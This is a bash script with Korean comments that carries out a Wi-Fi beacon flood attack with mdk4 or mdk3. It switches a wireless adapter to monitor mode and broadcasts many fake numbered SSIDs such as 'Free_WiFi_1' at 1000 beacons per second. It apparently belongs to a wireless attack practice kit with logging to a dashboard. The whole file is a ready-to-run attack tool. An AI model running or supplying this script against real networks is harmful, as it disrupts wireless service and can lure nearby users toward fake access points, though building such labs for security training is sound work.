#!/usr/bin/env bash
# ============================================================
# et_beacon_flood.sh - Beacon Flood 공격 (mdk4/mdk3 beacon 모드)
#   고정 base 이름 + 숫자 증가 방식으로 가짜 SSID 를 대량 송출한다.
#   예) BF_BASE="Free_WiFi_", BF_COUNT=30  ->  Free_WiFi_1 ... Free_WiFi_30
#
# 사용 예:
#   sudo bash et_beacon_flood.sh
#   sudo BF_BASE="Cafe_" BF_COUNT=50 BF_CHANNEL=6 bash et_beacon_flood.sh
#   sudo interface=wlan1 bash et_beacon_flood.sh     # 인터페이스 직접 지정
#
# 종료: Ctrl+C 또는 프로세스 종료 (인터페이스 복구 + attack_stop 기록)
# ============================================================
set -u

_script_dir="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
# et_config.conf / et_logger.sh 는 스크립트와 같은 폴더 또는 상위(프로젝트 루트)에 있다.
[ -f "${_script_dir}/et_config.conf" ] || _script_dir="${_script_dir}/.."
_config_file="${_script_dir}/et_config.conf"

# --- 설정 로드 (CRLF 제거 후 source) ---
_cli_interface="${interface:-}"
if [ -f "${_config_file}" ]; then
	# shellcheck disable=SC1090
	source <(tr -d '\r' < "${_config_file}")
fi
[ -n "${_cli_interface}" ] && interface="${_cli_interface}"

# --- 파라미터 (env 로 덮어쓰기 가능) ---
BF_BASE="${BF_BASE:-Free_WiFi_}"                 # 고정 base 이름 (뒤에 숫자)
BF_COUNT="${BF_COUNT:-30}"                        # 생성할 SSID 개수
BF_PPS="${BF_PPS:-1000}"                          # 초당 beacon 수
BF_CHANNEL="${BF_CHANNEL:-${channel:-6}}"         # 채널 (config channel > 기본 6)

# --- 로거 준비 ---
_log_dir="${WFSAT_LOG_DIR:-${log_dir:-/tmp/et_logs}}"
tmpdir="$(mktemp -d)/"
_logger_file="${_script_dir}/et_logger.sh"
if [ -f "${_logger_file}" ]; then
	# shellcheck disable=SC1090
	source <(tr -d '\r' < "${_logger_file}")
fi

# --- root 확인 ---
if [ "$(id -u 2>/dev/null || echo 1)" != "0" ]; then
	echo "[!] Root 권한이 필요합니다. sudo 로 실행하세요." >&2
	exit 1
fi

# --- 필수 도구 ---
mdk_command="mdk4"
command -v mdk4 > /dev/null 2>&1 || mdk_command="mdk3"
if ! command -v "${mdk_command}" > /dev/null 2>&1; then
	echo "[!] mdk4(또는 mdk3)가 필요합니다.  Install: sudo apt install -y mdk4" >&2
	exit 1
fi

# --- 인터페이스 자동 배정(대화형 입력 없음): 무선 어댑터 "순서"로 고른다.
#     기본은 2번째 어댑터(예: wlan1), 하나뿐이면 그 하나를 쓴다. ---
if [ -z "${interface:-}" ]; then
	declare -a _wifaces=()
	for _d in /sys/class/net/*/; do
		_nm=$(basename "${_d}")
		[ -d "/sys/class/net/${_nm}/wireless" ] && _wifaces+=("${_nm}")
	done
	echo "[*] 감지된 무선 어댑터(순서대로): ${_wifaces[*]:-(없음)}"
	if [ "${#_wifaces[@]}" -eq 0 ]; then
		echo "[!] 무선 인터페이스를 찾을 수 없습니다." >&2
		exit 1
	elif [ "${#_wifaces[@]}" -eq 1 ]; then
		interface="${_wifaces[0]}"
	else
		interface="${_wifaces[1]}"
	fi
	echo "[*] Beacon flood 인터페이스 자동 선택: ${interface}"
fi

if [ ! -d "/sys/class/net/${interface}/wireless" ]; then
	echo "[!] '${interface}' 는 무선 인터페이스가 아닙니다." >&2
	exit 1
fi

# --- 정리(트랩): mdk 종료 + 인터페이스 managed 복구 + 로그 종료 ---
_mdk_pid=""
_cleanup() {
	echo
	echo "[*] Beacon flood 종료 중…"
	[ -n "${_mdk_pid}" ] && kill "${_mdk_pid}" 2>/dev/null
	# 인터페이스 managed 모드 복구
	ip link set "${interface}" down > /dev/null 2>&1
	iw "${interface}" set type managed > /dev/null 2>&1
	ip link set "${interface}" up > /dev/null 2>&1
	command -v nmcli > /dev/null 2>&1 && nmcli dev set "${interface}" managed yes > /dev/null 2>&1
	if command -v log_finalize > /dev/null 2>&1; then
		log_finalize 2>/dev/null || true
	fi
	rm -rf "${tmpdir}" 2>/dev/null
	echo "[+] 정리 완료."
}
trap _cleanup EXIT INT TERM

# --- 모니터 모드 전환 ---
echo "[*] '${interface}' 를 monitor 모드로 전환합니다…"
command -v nmcli > /dev/null 2>&1 && nmcli dev set "${interface}" managed no > /dev/null 2>&1
ip link set "${interface}" down > /dev/null 2>&1
iw "${interface}" set type monitor > /dev/null 2>&1
ip link set "${interface}" up > /dev/null 2>&1
iw dev "${interface}" set channel "${BF_CHANNEL}" > /dev/null 2>&1
_mode=$(iw "${interface}" info 2>/dev/null | awk '/type/{print $2}')
if [ "${_mode}" != "monitor" ]; then
	echo "[!] ${interface} 를 monitor 모드로 전환하지 못했습니다. (airmon-ng check kill 필요할 수 있음)" >&2
	exit 1
fi

# --- SSID 목록 파일 생성 (base + 1..N) ---
_ssid_file="${tmpdir}ssids.txt"
: > "${_ssid_file}"
for _i in $(seq 1 "${BF_COUNT}"); do
	printf '%s%d\n' "${BF_BASE}" "${_i}" >> "${_ssid_file}"
done
echo "[*] SSID ${BF_COUNT}개 생성: ${BF_BASE}1 ~ ${BF_BASE}${BF_COUNT}"

# --- 로그 시작 (대시보드 실습 탭 연동) ---
essid="${BF_BASE}*"
bssid="(beacon flood · 다수)"
et_dos_attack="Beacon Flood"
channel="${BF_CHANNEL}"
if command -v log_init > /dev/null 2>&1; then
	log_init
fi

echo "[*] Beacon flood 시작: ${mdk_command} ${interface} b -f <ssids> -c ${BF_CHANNEL} -s ${BF_PPS}"
echo "    (종료하려면 Ctrl+C)"

# --- 공격 실행 (백그라운드로 띄우고 상태를 주기적으로 갱신) ---
"${mdk_command}" "${interface}" b -f "${_ssid_file}" -c "${BF_CHANNEL}" -s "${BF_PPS}" &
_mdk_pid=$!

while kill -0 "${_mdk_pid}" 2>/dev/null; do
	if command -v _log_update_summary > /dev/null 2>&1; then
		_log_update_summary 2>/dev/null || true
	fi
	sleep 5
done
